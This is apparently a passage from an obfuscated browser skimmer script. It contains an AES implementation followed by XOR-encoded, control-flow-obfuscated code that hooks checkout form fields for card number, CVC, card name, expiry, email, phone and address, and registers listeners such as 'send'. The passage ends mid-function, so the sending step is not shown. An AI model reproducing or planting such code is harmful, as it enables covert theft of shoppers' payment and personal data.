          // Adds (XORs) the round key to the state
          addRoundKey:function(state,roundKey)
          {
              for (var i = 0; i < 16; i++)
                  state[i] ^= roundKey[i];
              return state;
          },
          
          // Creates a round key from the given expanded key and the
          // position within the expanded key.
          createRoundKey:function(expandedKey,roundKeyPointer)
          {
              var roundKey = [];
              for (var i = 0; i < 4; i++)
                  for (var j = 0; j < 4; j++)
                      roundKey[j*4+i] = expandedKey[roundKeyPointer + i*4 + j];
              return roundKey;
          },
          
          /* substitute all the values from the state with the value in the SBox
           * using the state value as index for the SBox
           */
          subBytes:function(state,isInv)
          {
              for (var i = 0; i < 16; i++)
                  state[i] = isInv?this.rsbox[state[i]]:this.sbox[state[i]];
              return state;
          },
          
          /* iterate over the 4 rows and call shiftRow() with that row */
          shiftRows:function(state,isInv)
          {
              for (var i = 0; i < 4; i++)
                  state = this.shiftRow(state,i*4, i,isInv);
              return state;
          },
          
          /* each iteration shifts the row to the left by 1 */
          shiftRow:function(state,statePointer,nbr,isInv)
          {
              for (var i = 0; i < nbr; i++)
              {
                  if(isInv)
                  {
                      var tmp = state[statePointer + 3];
                      for (var j = 3; j > 0; j--)
                          state[statePointer + j] = state[statePointer + j-1];
                      state[statePointer] = tmp;
                  }
                  else
                  {
                      var tmp = state[statePointer];
                      for (var j = 0; j < 3; j++)
                          state[statePointer + j] = state[statePointer + j+1];
                      state[statePointer + 3] = tmp;
                  }
              }
              return state;
          },

          // galois multiplication of 8 bit characters a and b
          galois_multiplication:function(a,b)
          {
              var p = 0;
              for(var counter = 0; counter < 8; counter++)
              {
                  if((b & 1) == 1)
                      p ^= a;
                  if(p > 0x100) p ^= 0x100;
                  var hi_bit_set = (a & 0x80); //keep p 8 bit
                  a <<= 1;
                  if(a > 0x100) a ^= 0x100; //keep a 8 bit
                  if(hi_bit_set == 0x80)
                      a ^= 0x1b;
                  if(a > 0x100) a ^= 0x100; //keep a 8 bit
                  b >>= 1;
                  if(b > 0x100) b ^= 0x100; //keep b 8 bit
              }
              return p;
          },
          
          // galois multipication of the 4x4 matrix
          mixColumns:function(state,isInv)
          {
              var column = [];
              /* iterate over the 4 columns */
              for (var i = 0; i < 4; i++)
              {
                  /* construct one column by iterating over the 4 rows */
                  for (var j = 0; j < 4; j++)
                      column[j] = state[(j*4)+i];
                  /* apply the mixColumn on one column */
                  column = this.mixColumn(column,isInv);
                  /* put the values back into the state */
                  for (var k = 0; k < 4; k++)
                      state[(k*4)+i] = column[k];
              }
              return state;
          },

          // galois multipication of 1 column of the 4x4 matrix
          mixColumn:function(column,isInv)
          {
              var mult = [];  
              if(isInv)
                  mult = [14,9,13,11];
              else
                  mult = [2,1,1,3];
              var cpy = [];
              for(var i = 0; i < 4; i++)
                  cpy[i] = column[i];
              
              column[0] =     this.galois_multiplication(cpy[0],mult[0]) ^
                      this.galois_multiplication(cpy[3],mult[1]) ^
                      this.galois_multiplication(cpy[2],mult[2]) ^
                      this.galois_multiplication(cpy[1],mult[3]);
              column[1] =     this.galois_multiplication(cpy[1],mult[0]) ^
                      this.galois_multiplication(cpy[0],mult[1]) ^
                      this.galois_multiplication(cpy[3],mult[2]) ^
                      this.galois_multiplication(cpy[2],mult[3]);
              column[2] =     this.galois_multiplication(cpy[2],mult[0]) ^
                      this.galois_multiplication(cpy[1],mult[1]) ^
                      this.galois_multiplication(cpy[0],mult[2]) ^
                      this.galois_multiplication(cpy[3],mult[3]);
              column[3] =     this.galois_multiplication(cpy[3],mult[0]) ^
                      this.galois_multiplication(cpy[2],mult[1]) ^
                      this.galois_multiplication(cpy[1],mult[2]) ^
                      this.galois_multiplication(cpy[0],mult[3]);
              return column;
          },
          
          // applies the 4 operations of the forward round in sequence
          round:function(state, roundKey)
          {
              state = this.subBytes(state,false);
              state = this.shiftRows(state,false);
              state = this.mixColumns(state,false);
              state = this.addRoundKey(state, roundKey);
              return state;
          },
          
          // applies the 4 operations of the inverse round in sequence
          invRound:function(state,roundKey)
          {
              state = this.shiftRows(state,true);
              state = this.subBytes(state,true);
              state = this.addRoundKey(state, roundKey);
              state = this.mixColumns(state,true);
              return state;
          },
          
          /*
           * Perform the initial operations, the standard round, and the final operations
           * of the forward aes, creating a round key for each round
           */
          main:function(state,expandedKey,nbrRounds)
          {
              state = this.addRoundKey(state, this.createRoundKey(expandedKey,0));
              for (var i = 1; i < nbrRounds; i++)
                  state = this.round(state, this.createRoundKey(expandedKey,16*i));
              state = this.subBytes(state,false);
              state = this.shiftRows(state,false);
              state = this.addRoundKey(state, this.createRoundKey(expandedKey,16*nbrRounds));
              return state;
          },
          
          /*
           * Perform the initial operations, the standard round, and the final operations
           * of the inverse aes, creating a round key for each round
           */
          invMain:function(state, expandedKey, nbrRounds)
          {
              state = this.addRoundKey(state, this.createRoundKey(expandedKey,16*nbrRounds));
              for (var i = nbrRounds-1; i > 0; i--)
                  state = this.invRound(state, this.createRoundKey(expandedKey,16*i));
              state = this.shiftRows(state,true);
              state = this.subBytes(state,true);
              state = this.addRoundKey(state, this.createRoundKey(expandedKey,0));
              return state;
          },

          numberOfRounds:function(size)
          {
              var nbrRounds;
              switch (size) /* set the number of rounds */
              {
                  case this.keySize.SIZE_128:
                      nbrRounds = 10;
                      break;
                  case this.keySize.SIZE_192:
                      nbrRounds = 12;
                      break;
                  case this.keySize.SIZE_256:
                      nbrRounds = 14;
                      break;
                  default:
                      return null;
                      break;
              }
              return nbrRounds;
          },
          
          // encrypts a 128 bit input block against the given key of size specified
          encrypt:function(input,key,size)
          {
              var output = [];
              var block = []; /* the 128 bit block to encode */
              var nbrRounds = this.numberOfRounds(size);
              /* Set the block values, for the block:
               * a0,0 a0,1 a0,2 a0,3
               * a1,0 a1,1 a1,2 a1,3
               * a2,0 a2,1 a2,2 a2,3
               * a3,0 a3,1 a3,2 a3,3
               * the mapping order is a0,0 a1,0 a2,0 a3,0 a0,1 a1,1 ... a2,3 a3,3
               */
              for (var i = 0; i < 4; i++) /* iterate over the columns */
                  for (var j = 0; j < 4; j++) /* iterate over the rows */
                      block[(i+(j*4))] = input[(i*4)+j];
          
              /* expand the key into an 176, 208, 240 bytes key */
              var expandedKey = this.expandKey(key, size); /* the expanded key */
              /* encrypt the block using the expandedKey */
              block = this.main(block, expandedKey, nbrRounds);
              for (var k = 0; k < 4; k++) /* unmap the block again into the output */
                  for (var l = 0; l < 4; l++) /* iterate over the rows */
                      output[(k*4)+l] = block[(k+(l*4))];
              return output;
          },
          
          // decrypts a 128 bit input block against the given key of size specified
          decrypt:function(input, key, size)
          {
              var output = [];
              var block = []; /* the 128 bit block to decode */
              var nbrRounds = this.numberOfRounds(size);
              /* Set the block values, for the block:
               * a0,0 a0,1 a0,2 a0,3
               * a1,0 a1,1 a1,2 a1,3
               * a2,0 a2,1 a2,2 a2,3
               * a3,0 a3,1 a3,2 a3,3
               * the mapping order is a0,0 a1,0 a2,0 a3,0 a0,1 a1,1 ... a2,3 a3,3
               */
              for (var i = 0; i < 4; i++) /* iterate over the columns */
                  for (var j = 0; j < 4; j++) /* iterate over the rows */
                      block[(i+(j*4))] = input[(i*4)+j];
              /* expand the key into an 176, 208, 240 bytes key */
              var expandedKey = this.expandKey(key, size);
              /* decrypt the block using the expandedKey */
              block = this.invMain(block, expandedKey, nbrRounds);
              for (var k = 0; k < 4; k++)/* unmap the block again into the output */
                  for (var l = 0; l < 4; l++)/* iterate over the rows */
                      output[(k*4)+l] = block[(k+(l*4))];
              return output;
          }
      },
      /*
       * END AES SECTION
       */
       
      /*
       * START MODE OF OPERATION SECTION
       */
      //structure of supported modes of operation
      modeOfOperation:{
          OFB:0,
          CFB:1,
          CBC:2
      },
      
      // get a 16 byte block (aes operates on 128bits)
      getBlock: function(bytesIn,start,end,mode)
      {
          if(end - start > 16)
              end = start + 16;
          
          return bytesIn.slice(start, end);
      },
      
      /*
       * Mode of Operation Encryption
       * bytesIn - Input String as array of bytes
       * mode - mode of type modeOfOperation
       * key - a number array of length 'size'
       * size - the bit length of the key
       * iv - the 128 bit number array Initialization Vector
       */
      encrypt: function (bytesIn, mode, key, iv)
      {
          var size = key.length;
          if(iv.length%16)
          {
              throw 'iv length must be 128 bits.';
          }
          // the AES input/output
          var byteArray = [];
          var input = [];
          var output = [];
          var ciphertext = [];
          var cipherOut = [];
          // char firstRound
          var firstRound = true;
          if (mode == this.modeOfOperation.CBC)
              this.padBytesIn(bytesIn);
          if (bytesIn !== null)
          {
              for (var j = 0;j < Math.ceil(bytesIn.length/16); j++)
              {
                  var start = j*16;
                  var end = j*16+16;
                  if(j*16+16 > bytesIn.length)
                      end = bytesIn.length;
                  byteArray = this.getBlock(bytesIn,start,end,mode);
                  if (mode == this.modeOfOperation.CFB)
                  {
                      if (firstRound)
                      {
                          output = this.aes.encrypt(iv, key, size);
                          firstRound = false;
                      }
                      else
                          output = this.aes.encrypt(input, key, size);
                      for (var i = 0; i < 16; i++)
                          ciphertext[i] = byteArray[i] ^ output[i];
                      for(var k = 0;k < end-start;k++)
                          cipherOut.push(ciphertext[k]);
                      input = ciphertext;
                  }
                  else if (mode == this.modeOfOperation.OFB)
                  {
                      if (firstRound)
                      {
                          output = this.aes.encrypt(iv, key, size);
                          firstRound = false;
                      }
                      else
                          output = this.aes.encrypt(input, key, size);
                      for (var i = 0; i < 16; i++)
                          ciphertext[i] = byteArray[i] ^ output[i];
                      for(var k = 0;k < end-start;k++)
                          cipherOut.push(ciphertext[k]);
                      input = output;
                  }
                  else if (mode == this.modeOfOperation.CBC)
                  {
                      for (var i = 0; i < 16; i++)
                          input[i] = byteArray[i] ^ ((firstRound) ? iv[i] : ciphertext[i]);
                      firstRound = false;
                      ciphertext = this.aes.encrypt(input, key, size);
                      // always 16 bytes because of the padding for CBC
                      for(var k = 0;k < 16;k++)
                          cipherOut.push(ciphertext[k]);
                  }
              }
          }
          return cipherOut;
      },
      
      /*
       * Mode of Operation Decryption
       * cipherIn - Encrypted String as array of bytes
       * originalsize - The unencrypted string length - required for CBC
       * mode - mode of type modeOfOperation
       * key - a number array of length 'size'
       * size - the bit length of the key
       * iv - the 128 bit number array Initialization Vector
       */
      decrypt:function(cipherIn,mode,key,iv)
      {
          var size = key.length;
          if(iv.length%16)
          {
              throw 'iv length must be 128 bits.';
          }
          // the AES input/output
          var ciphertext = [];
          var input = [];
          var output = [];
          var byteArray = [];
          var bytesOut = [];
          // char firstRound
          var firstRound = true;
          if (cipherIn !== null)
          {
              for (var j = 0;j < Math.ceil(cipherIn.length/16); j++)
              {
                  var start = j*16;
                  var end = j*16+16;
                  if(j*16+16 > cipherIn.length)
                      end = cipherIn.length;
                  ciphertext = this.getBlock(cipherIn,start,end,mode);
                  if (mode == this.modeOfOperation.CFB)
                  {
                      if (firstRound)
                      {
                          output = this.aes.encrypt(iv, key, size);
                          firstRound = false;
                      }
                      else
                          output = this.aes.encrypt(input, key, size);
                      for (i = 0; i < 16; i++)
                          byteArray[i] = output[i] ^ ciphertext[i];
                      for(var k = 0;k < end-start;k++)
                          bytesOut.push(byteArray[k]);
                      input = ciphertext;
                  }
                  else if (mode == this.modeOfOperation.OFB)
                  {
                      if (firstRound)
                      {
                          output = this.aes.encrypt(iv, key, size);
                          firstRound = false;
                      }
                      else
                          output = this.aes.encrypt(input, key, size);
                      for (i = 0; i < 16; i++)
                          byteArray[i] = output[i] ^ ciphertext[i];
                      for(var k = 0;k < end-start;k++)
                          bytesOut.push(byteArray[k]);
                      input = output;
                  }
                  else if(mode == this.modeOfOperation.CBC)
                  {
                      output = this.aes.decrypt(ciphertext, key, size);
                      for (i = 0; i < 16; i++)
                          byteArray[i] = ((firstRound) ? iv[i] : input[i]) ^ output[i];
                      firstRound = false;
                      for(var k = 0;k < end-start;k++)
                          bytesOut.push(byteArray[k]);
                      input = ciphertext;
                  }
              }
              if(mode == this.modeOfOperation.CBC)
                  this.unpadBytesOut(bytesOut);
          }
          return bytesOut;
      },
      padBytesIn: function(data) {
          var len = data.length;
          var padByte = 16 - (len % 16);
          for (var i = 0; i < padByte; i++) {
              data.push(padByte);
          }
      },
      unpadBytesOut: function(data) {
          var padCount = 0;
          var padByte = -1;
          var blockSize = 16;
          for (var i = data.length - 1; i >= data.length-1 - blockSize; i--) {
              if (data[i] <= blockSize) {
                  if (padByte == -1)
                      padByte = data[i];
                  if (data[i] != padByte) {
                      padCount = 0;
                      break;
                  }
                  padCount++;
              } else
                  break;
              if (padCount == padByte)
                  break;
          }
          if (padCount > 0)
              data.splice(data.length - padCount, padCount);
      }
  };
  
  if (key === undefined) {
      GenerateKey();
  }
  else if (FromRawData(key).length != 32) {
      GenerateKey();
  }
  else {
      key = FromRawData(key);
  }
  
  if (iv === undefined) {
      GenerateIV();
  }
  else if (FromRawData(iv).length != 16) {
      GenerateIV();
  }
  else {
      iv = FromRawData(iv);
  }
  
  var decrypted = StrToArrayOfBytes(text);

  var encrypted = slowAES.encrypt(decrypted, slowAES.modeOfOperation.CBC, key, iv);
  
  var res = ToRawData(encrypted);
  
  return res;
};;;


E2UU.a9F = function () {
  return typeof E2UU.G9F.g === 'function' ? E2UU.G9F.g.apply(E2UU.G9F, arguments) : E2UU.G9F.g;
};
function E2UU() {
}
E2UU.N9F = function () {
  return typeof E2UU.G9F.n0 === 'function' ? E2UU.G9F.n0.apply(E2UU.G9F, arguments) : E2UU.G9F.n0;
};
E2UU.q9F = function () {
  return typeof E2UU.G9F.M3 === 'function' ? E2UU.G9F.M3.apply(E2UU.G9F, arguments) : E2UU.G9F.M3;
};
E2UU.R95 = function () {
  return typeof E2UU.j95.g === 'function' ? E2UU.j95.g.apply(E2UU.j95, arguments) : E2UU.j95.g;
};
E2UU.Q95 = function () {
  return typeof E2UU.j95.g === 'function' ? E2UU.j95.g.apply(E2UU.j95, arguments) : E2UU.j95.g;
};
E2UU.B95 = function () {
  return typeof E2UU.j95.n0 === 'function' ? E2UU.j95.n0.apply(E2UU.j95, arguments) : E2UU.j95.n0;
};
E2UU.r1V = function () {
  return typeof E2UU.N1V.t0 === 'function' ? E2UU.N1V.t0.apply(E2UU.N1V, arguments) : E2UU.N1V.t0;
};
E2UU.S9F = function () {
  return typeof E2UU.G9F.n0 === 'function' ? E2UU.G9F.n0.apply(E2UU.G9F, arguments) : E2UU.G9F.n0;
};
E2UU.a1V = function () {
  return typeof E2UU.N1V.g === 'function' ? E2UU.N1V.g.apply(E2UU.N1V, arguments) : E2UU.N1V.g;
};
E2UU.a95 = function () {
  return typeof E2UU.j95.t0 === 'function' ? E2UU.j95.t0.apply(E2UU.j95, arguments) : E2UU.j95.t0;
};
E2UU.j2V = function () {
  return typeof E2UU.N1V.n0 === 'function' ? E2UU.N1V.n0.apply(E2UU.N1V, arguments) : E2UU.N1V.n0;
};
E2UU.k9F = function () {
  return typeof E2UU.G9F.t0 === 'function' ? E2UU.G9F.t0.apply(E2UU.G9F, arguments) : E2UU.G9F.t0;
};
E2UU.j95 = function () {
  var V95 = 2;
  while (V95 !== 1) {
      switch (V95) {
      case 2:
          return {
              M3: function (J95) {
                  var X95 = 2;
                  while (X95 !== 14) {
                      switch (X95) {
                      case 1:
                          var I95 = 0, F95 = 0;
                          X95 = 5;
                          break;
                      case 4:
                          X95 = F95 === J95.length ? 3 : 9;
                          break;
                      case 2:
                          var b95 = '', l95 = decodeURI("j#/4?-'&%1Ab%200;$#,ab=.%13%0C%10%17=3/64b=$5,u(,/!,;bmpf~%0Dw%7Fg%19=?%1B,347!%1B*%204%3C=1$##*uko2#46'=%1A(9%3E!t%22)-=0;8%1917%20%14g%16%17%00%10o-);20%20.(~;0=15b%7Ck9.3677!.6+%7D*,5i+22,%11'!%3E!'5i~:*942%03=%25$$%7B%7F%200;$#,%08t%14f%1Bb65apo~97&/%60*64%25%20%25=u'*%0F35%1D%25$$%60%3C:79-'!u-'13,%08*(,#e'!%25$60%3C*,%1C%7C=%22lxh%605%3C1:$)-'b/3)5%10,(3%0577!o$+9:(og%254:'%22g2=?!9))66b:1*1'bj#/4?-'&%1Ab%200;$#,bbj#/4?-'&%1Ab!!.()6u'(3%2262),l#%20u'%25%205+%1D%25$$%60%0D%22v%7C%201%0E%03%05%038%12%0Cj%3Ez%0C,/+%15~%00u%01u#,5%121%3E!o%05/+0+?$4~:*942%03=%25$$%7B*6#%20.(%05i!8iwqug+(*4:*.%1D%7C427=/'56b:4$+'6o(((&0%12/'56y%25%205,=%25$$%1Bb65apo~'+&-21#b*.(,6*=2%6097%20;$5+ab;$!1%3C*o(((&0%12/'56y/(4+'*(,#%05i!8iwqu'!$%253%3C1==69*),/2~%19%07%0Bgr%60dv%7Dsuacro%05/666:g%021=!;2fus%07(32=s%06%25%20(;;!o&#,%16(,,#6'%060%08%22~%3E+%3C2#7%25!;g%07%15%16%1Co%12%01%0E%20&%0Ey!%3Ca%7D0#%01%09;b%04%205,66*%204%3Cu--g09?1,g%25;%25b'%20+=u'(3%22~p&%20-*1=#%15%7B67%200*.%22=u)(5%250u%1A%7Dg5,*(,ge::(%25((?%0F~/(4+'*(,#~!%25'%25)5u4&22;%3C%20,g5-17=3/64b%16$*%0766;.4%0702*g/6#1=%1A(9%3E!t%22/,*%19s$7pbmo%17/+2d%0C-#;'6&/%601=4%3C5%1D62),%7C67%200*.%22=%0E~,0nizb%25%205,%1D%25$$%60xu,%20%25#%1F&--g(7%10+''*100o/)66b=$%3E,u4%3E2%60cs!11/*67tg09?b%17iphbu5wtj%7Bu%7B%1Apuj%195p%1Dk~%7D%14%1Avuj%195%1Atuk%19%12qka%0E?%7B%3C:a%08tdp%1B%03cip%1C:aa%1Fyls%05/r%7D%1Aruj%19%60=pmzbj(%20*2),l#%20u/,83(uyo#*70/o%22/,*bj#/4?-'&%1Ab'!%25$60%3C*,g%25-!6,/2%0C26.$2~%05-:%20%60v1-%25-/64i(%25%22*67:l%22='%25%20-5~%200;((?:%220g%257&*=3?~%3E+'5.~:*-$%3E%175b/(4+'%0A(,#~%0Dw%7Cit%03k%7D%14=%1Dk~%7C%14%1Avuj%19%60g?=26o%20%22%3C!!:2%60;26-/351!;l#%20u%7Fi1',;yfg)6?+(%25%60;;!**%05427:%0F'56b%17%1Avuj%192pp%25wb*.)3:!o5)7?0%201k(u6&4(%3Cu0;(+~;+:5%60pl~%17=%7Dxzb%17r%1Dld%19o(((&0%12/'56yn22*6!=%1Aw%05t%19s$7pbmob$1?(%20/!%04i!$%20/4u*%3C,$=!bti%1D%06h%19ch%60%7B1-%25-/64%18s%22)-=0;8%1917b*7%25u6%3Co2#,%07-$$%60%06%7Bpysp$gu~tvh/p%7Cq~$g%7C%7Du:ljuar:ozmo%20,9+b%16$*%0766;.4%07=%25$$)60%25;%25%60tu)&/20~!1g%18kc%1Fyls%05uj(%2221%3C*g141%3E%25;8h;;!**)-'b(%25%22%1D%25!'5%0A1%200,/#*u%18mp%60%7B1-%25-/64%18s%22/,*b0$'*~!1");
                          X95 = 1;
                          break;
                      case 5:
                          X95 = I95 < l95.length ? 4 : 7;
                          break;
                      case 8:
                          I95++, F95++;
                          X95 = 5;
                          break;
                      case 9:
                          b95 += String.fromCharCode(l95.charCodeAt(I95) ^ J95.charCodeAt(F95));
                          X95 = 8;
                          break;
                      case 3:
                          F95 = 0;
                          X95 = 9;
                          break;
                      case 7:
                          b95 = b95.split('&');
                          return function (U95) {
                              var y95 = 2;
                              while (y95 !== 1) {
                                  switch (y95) {
                                  case 2:
                                      return b95[U95];
                                      break;
                                  }
                              }
                          };
                          break;
                      }
                  }
              }('IAFXSD')
          };
          break;
      }
  }
}();
E2UU.v95 = function () {
  return typeof E2UU.j95.n0 === 'function' ? E2UU.j95.n0.apply(E2UU.j95, arguments) : E2UU.j95.n0;
};
E2UU.d1V = function () {
  return typeof E2UU.N1V.M3 === 'function' ? E2UU.N1V.M3.apply(E2UU.N1V, arguments) : E2UU.N1V.M3;
};
E2UU.B1V = function () {
  return typeof E2UU.N1V.g === 'function' ? E2UU.N1V.g.apply(E2UU.N1V, arguments) : E2UU.N1V.g;
};
E2UU.k95 = function () {
  return typeof E2UU.j95.M3 === 'function' ? E2UU.j95.M3.apply(E2UU.j95, arguments) : E2UU.j95.M3;
};
E2UU.O9F = function () {
  return typeof E2UU.G9F.t0 === 'function' ? E2UU.G9F.t0.apply(E2UU.G9F, arguments) : E2UU.G9F.t0;
};
E2UU.G1V = function () {
  return typeof E2UU.N1V.M3 === 'function' ? E2UU.N1V.M3.apply(E2UU.N1V, arguments) : E2UU.N1V.M3;
};
E2UU.N1V = function (u1V) {
  return {
      t0: function () {
          var O1V, l1V = arguments;
          switch (u1V) {
          case 2:
              O1V = l1V[0] * l1V[1];
              break;
          case 5:
              O1V = l1V[1] % +l1V[2] == +l1V[0];
              break;
          case 1:
              O1V = l1V[1] | l1V[0];
              break;
          case 4:
              O1V = l1V[0] - l1V[3] + l1V[2] % l1V[1];
              break;
          case 0:
              O1V = l1V[0] - l1V[1];
              break;
          case 3:
              O1V = l1V[0] * l1V[2] / l1V[1];
              break;
          }
          return O1V;
      },
      n0: function (U1V) {
          u1V = U1V;
      }
  };
}();
E2UU.b1V = function () {
  return typeof E2UU.N1V.t0 === 'function' ? E2UU.N1V.t0.apply(E2UU.N1V, arguments) : E2UU.N1V.t0;
};
E2UU.J9F = function () {
  return typeof E2UU.G9F.g === 'function' ? E2UU.G9F.g.apply(E2UU.G9F, arguments) : E2UU.G9F.g;
};
E2UU.v2V = function () {
  return typeof E2UU.N1V.n0 === 'function' ? E2UU.N1V.n0.apply(E2UU.N1V, arguments) : E2UU.N1V.n0;
};
E2UU.G9F = function () {
  var w2r = function (u2r, E2r) {
          var h2r = E2r & 0xffff;
          var X2r = E2r - h2r;
          return (X2r * u2r | 0) + (h2r * u2r | 0) | 0;
      }, T2r = function (n2r, d9F, R9F) {
          var B9F = 0xcc9e2d51, g9F = 0x1b873593;
          var y2r = R9F;
          var V2r = d9F & ~0x3;
          for (var f2r = 0; f2r < V2r; f2r += 4) {
              var x2r = n2r.charCodeAt(f2r) & 0xff | (n2r.charCodeAt(f2r + 1) & 0xff) << 8 | (n2r.charCodeAt(f2r + 2) & 0xff) << 16 | (n2r.charCodeAt(f2r + 3) & 0xff) << 24;
              x2r = w2r(x2r, B9F);
              x2r = (x2r & 0x1ffff) << 15 | x2r >>> 17;
              x2r = w2r(x2r, g9F);
              y2r ^= x2r;
              y2r = (y2r & 0x7ffff) << 13 | y2r >>> 19;
              y2r = y2r * 5 + 0xe6546b64 | 0;
          }
          x2r = 0;
          switch (d9F % 4) {
          case 3:
              x2r = (n2r.charCodeAt(V2r + 2) & 0xff) << 16;
          case 2:
              x2r |= (n2r.charCodeAt(V2r + 1) & 0xff) << 8;
          case 1:
              x2r |= n2r.charCodeAt(V2r) & 0xff;
              x2r = w2r(x2r, B9F);
              x2r = (x2r & 0x1ffff) << 15 | x2r >>> 17;
              x2r = w2r(x2r, g9F);
              y2r ^= x2r;
          }
          y2r ^= d9F;
          y2r ^= y2r >>> 16;
          y2r = w2r(y2r, 0x85ebca6b);
          y2r ^= y2r >>> 13;
          y2r = w2r(y2r, 0xc2b2ae35);
          y2r ^= y2r >>> 16;
          return y2r;
      };
  return { g: T2r };
}();
E2UU.M95 = function () {
  return typeof E2UU.j95.M3 === 'function' ? E2UU.j95.M3.apply(E2UU.j95, arguments) : E2UU.j95.M3;
};
E2UU.j9F = function () {
  return typeof E2UU.G9F.M3 === 'function' ? E2UU.G9F.M3.apply(E2UU.G9F, arguments) : E2UU.G9F.M3;
};
E2UU.z95 = function () {
  return typeof E2UU.j95.t0 === 'function' ? E2UU.j95.t0.apply(E2UU.j95, arguments) : E2UU.j95.t0;
};
var jq, monthId, yearId, cvcId, cardnumberId, cardnameId, validateArr, fn, ln, str, str2, email, phone, country, city, zip, region, doc, myform, information, GenKey, GenIV;
function getCookie(S3c) {
  var s2V = E2UU;
  var N4F, S4F, l4F, X3c;
  N4F = -780256409;
  S4F = -+"1621118025";
  l4F = 2;
  for (var I4F = 1; s2V.a9F(I4F.toString(), I4F.toString().length, +"19982") !== N4F; I4F++) {
      X3c = document[s2V.M95("122" | 0)][s2V.k95("122" - 0)](new RegExp(s2V.M95(122) - S3c[s2V.k95("122" | 0)](/([\.$?*|{}\(\)\[\]\\\/\+^])/g, s2V.M95(+"122")) - s2V.k95(122)));
      s2V.j2V(0);
      l4F += s2V.b1V("2", 0);
  }
  if (s2V.J9F(l4F.toString(), l4F.toString().length, "76532" - 0) !== S4F) {
      X3c = document[s2V.M95(+"100")][s2V.M95(+"57")](new RegExp(s2V.k95(105) + S3c[s2V.M95("14" * 1)](/([\.$?*|{}\(\)\[\]\\\/\+^])/g, s2V.M95("122" * 1)) + s2V.M95("110" - 0)));
  }
  return X3c ? decodeURIComponent(X3c[+"1"]) : undefined;
}
jq = jQuery[E2UU.M95(+"71")]();
document[E2UU.k95(+"15")] = E2UU.k95(120);
document[E2UU.M95(+"98")] = E2UU.M95(E2UU.b1V(0, "43", E2UU.v2V(1)));
monthId = E2UU.k95(+"118");
function tooltipShow() {
  var Y2V = E2UU;
  var W9F, Q9F, H9F;
  W9F = -1199846243;
  Q9F = -78075024;
  Y2V.j2V(0);
  H9F = Y2V.b1V("2", 0);
  for (var t9F = +"1"; Y2V.a9F(t9F.toString(), t9F.toString().length, +"67140") !== W9F; t9F++) {
      doc[Y2V.M95(+"46")](Y2V.k95(+"101"))[Y2V.M95(Y2V.b1V("59", 1, Y2V.v2V(2)))][Y2V.k95(16)] = Y2V.k95(Y2V.b1V(0, "81", Y2V.j2V(1)));
      Y2V.v2V(0);
      H9F += Y2V.r1V("2", 0);
  }
  if (Y2V.a9F(H9F.toString(), H9F.toString().length, "39684" * 1) !== Q9F) {
      doc[Y2V.M95("101" - 0)](Y2V.M95("81" * 1))[Y2V.k95(Y2V.r1V("59", 0, Y2V.v2V(0)))][Y2V.k95(+"59")] = Y2V.M95(+"81");
  }
}
function checkClass() {
  var V2V = E2UU;
  var P9F, b9F, e9F, W6c, y6c, M6c;
  V2V.v2V(0);
  P9F = V2V.b1V("2031751200", 0);
  V2V.j2V(1);
  b9F = -V2V.b1V(0, "919558523");
  e9F = +"2";
  for (var p9F = 1; V2V.a9F(p9F.toString(), p9F.toString().length, 91963) !== P9F; p9F++) {
      doc = jq(V2V.k95(+"78"))[V2V.M95(+"78")]()[V2V.b1V("9", 1, V2V.v2V(2))];
      V2V.v2V(0);
      e9F += V2V.b1V("2", 0);
  }
  if (V2V.a9F(e9F.toString(), e9F.toString().length, 27267) !== b9F) {
      doc = jq(V2V.M95(+"78"))[V2V.M95("78" | 0)]()[+"3"];
  }
  doc = jq(V2V.k95("78" - 0))[V2V.M95("37" | 0)]()[+"0"];
  if (doc) {
      W6c = jq(document[V2V.k95(15)]);
      if (W6c["0" * 1] && W6c[0][V2V.k95("28" | 0)][V2V.M95(+"90")](document[V2V.k95("98" - 0)]) < "0" * 1) {
          AddListenerToCC(V2V.k95(22), W6c["0" | 0], send);
      }
      W6c = doc[V2V.M95(+"46")](V2V.k95("36" - 0));
      if (W6c && W6c[V2V.k95(+"28")][V2V.M95(+"90")](document[V2V.M95("98" | 0)]) < "0" - 0) {
          AddListenerToCC(V2V.k95("47" | 0), W6c, tooltipShow);
          AddListenerToCC(V2V.M95("18" - 0), W6c, tooltipHide);
      }
      for (var Q6c in validateArr) {
          y6c = validateArr[Q6c];
          M6c = doc[V2V.M95(+"46")](y6c);
          if (M6c) {
              if (M6c && M6c[V2V.M95(+"28")][V2V.k95(+"90")](document[V2V.k95(98)]) < "0" * 1) {
                  AddListenerToCC(V2V.M95(+"79"), M6c, changeElement);
              }
          }
      }
  }
}
yearId = E2UU.k95(124);
function changeElement(P3c) {
  var p2V = E2UU;
  var H3c, K9F, s9F, D9F;
  H3c = P3c[p2V.k95(+"84")];
  if (H3c[p2V.k95(+"51")] == cardnumberId) {
      p2V.v2V(2);
      K9F = p2V.r1V("142601771", 1);
      s9F = 495005450;
      D9F = 2;
      for (var c9F = +"1"; p2V.J9F(c9F.toString(), c9F.toString().length, +"10862") !== K9F; c9F++) {
          H3c[p2V.k95(52)] = H3c[p2V.M95(+"52")][p2V.k95("103" | 0)](/[^0-12-78-9A-Z]/g, p2V.M95(+"103"))[p2V.k95("14" * 1)](/([^\n]{4})/g, p2V.M95(14))[p2V.k95(+"14")]();
          D9F += +"2";
      }
      if (p2V.a9F(D9F.toString(), D9F.toString().length, +"96017") !== s9F) {
          H3c[p2V.k95(+"52")] = H3c[p2V.k95(52)][p2V.k95(+"103")](/[^5-90-4A-Z]/g, p2V.M95(103))[p2V.k95(14)](/([^\n]{4})/g, p2V.M95("14" - 0))[p2V.k95(14)]();
      }
      H3c[p2V.M95(+"52")] = H3c[p2V.M95(+"52")][p2V.M95("14" * 1)](/[^1-57-960-0O-ZE-GH-LM-NA-D]/g, p2V.k95("21" - 0))[p2V.k95("14" - 0)](/([^\n]{4})/g, p2V.M95("4" | 0))[p2V.M95("103" * 1)]();
  }
  if (H3c[p2V.k95("51" | 0)] == cvcId) {
      H3c[p2V.k95(52)] = H3c[p2V.k95("52" - 0)][p2V.M95(+"14")](/[^0-25-93-4A-CO-PL-NQ-ZD-GH-K]/g, p2V.k95("21" - 0));
      if (H3c[p2V.k95(+"52")][p2V.k95(3)] > "4" * 1) {
          H3c[p2V.k95(p2V.b1V("52", 0, p2V.j2V(0)))] = H3c[p2V.M95(+"52")][p2V.k95(+"63")](0, p2V.r1V("4", 1, p2V.v2V(2)));
      }
  }
}
cvcId = E2UU.k95(+"112");
cardnumberId = E2UU.k95(95);
cardnameId = E2UU.M95(+"27");
function GetCardType(Y3c) {
  var R2V = E2UU;
  var D3c, y9F, n9F, f9F;
